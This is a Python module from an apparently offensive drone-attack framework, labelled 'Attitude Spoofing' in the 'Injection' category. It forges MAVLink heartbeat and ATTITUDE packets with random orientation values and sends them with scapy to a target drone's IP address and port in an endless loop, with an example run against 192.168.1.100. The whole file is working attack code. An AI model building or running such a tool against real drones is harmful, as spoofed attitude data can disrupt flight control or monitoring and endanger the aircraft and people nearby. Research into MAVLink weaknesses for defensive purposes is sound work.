# modules/attitude_spoofing.py

from core.base import BaseModule
from pymavlink import mavutil
from scapy.all import *
import time
import random
import socket

def is_valid_ip(ip):
    try:
        socket.inet_pton(socket.AF_INET, ip)
        return True
    except socket.error:
        return False

class AttitudeSpoofingModule(BaseModule):
    def __init__(self):
        super().__init__(name="Attitude Spoofing", description="Attacks drone's attitude control", category="Injection")
        self.options = {
            "target": {"value": "", "required": True, "description": "The target IP address"},
            "port": {"value": "14550", "required": True, "description": "The target port"},
        }

    def create_heartbeat(self):
        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = 1
        mav.srcComponent = 1

        heartbeat = mav.heartbeat_encode(
            type=mavutil.mavlink.MAV_TYPE_QUADROTOR,
            autopilot=mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
            base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
            custom_mode=3,
            system_status=mavutil.mavlink.MAV_STATE_ACTIVE
        )

        return heartbeat.pack(mav)

    def create_attitude(self):
        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = 1
        mav.srcComponent = 1

        roll = random.uniform(-1.0, 1.0)
        pitch = random.uniform(-1.0, 1.0)
        yaw = random.uniform(-3.14, 3.14)
        rollspeed = random.uniform(-0.1, 0.1)
        pitchspeed = random.uniform(-0.1, 0.1)
        yawspeed = random.uniform(-0.1, 0.1)

        attitude = mav.attitude_encode(
            time_boot_ms=int(time.time() * 1e3) % 4294967295,
            roll=roll,
            pitch=pitch,
            yaw=yaw,
            rollspeed=rollspeed,
            pitchspeed=pitchspeed,
            yawspeed=yawspeed
        )

        return attitude.pack(mav)

    def send_mavlink_packet(self, packet_data, target_ip, target_port):
        if not is_valid_ip(target_ip):
            print(f"Error: Invalid IP address {target_ip}")
            return
        
        packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=packet_data)
        try:
            send(packet)
        except OSError as e:
            print(f"Error sending packet: {e}")

    def run(self):
        target_ip = self.options["target"]["value"].strip()
        target_port = self.options["port"]["value"].strip()

        # Debug prints to check the values
        print(f"Debug: Retrieved target IP is '{target_ip}'")
        print(f"Debug: Retrieved target port is '{target_port}'")

        try:
            target_port = int(target_port)
        except ValueError:
            print("Invalid port value.")
            return

        if not is_valid_ip(target_ip):
            print(f"Invalid target IP: {target_ip}")
            return

        if target_port <= 0:
            print("Invalid target port.")
            return

        while True:
            heartbeat_packet = self.create_heartbeat()
            attitude_packet = self.create_attitude()

            self.send_mavlink_packet(heartbeat_packet, target_ip, target_port)
            self.send_mavlink_packet(attitude_packet, target_ip, target_port)
            
            print(f"Sent heartbeat and ATTITUDE packets to {target_ip}:{target_port}")
            time.sleep(1)  # Add delay to avoid overwhelming the network

    def show_options(self):
        print("Module Options")
        print("==============")
        for option, details in self.options.items():
            required = "(Required)" if details["required"] else "(Optional)"
            print(f"{option}: {details['value']} {required} - {details['description']}")

# Example instantiation
if __name__ == "__main__":
    module = AttitudeSpoofingModule()
    module.show_options()
    module.set_option("target", "192.168.1.100")
    module.set_option("port", "14550")
    module.run()
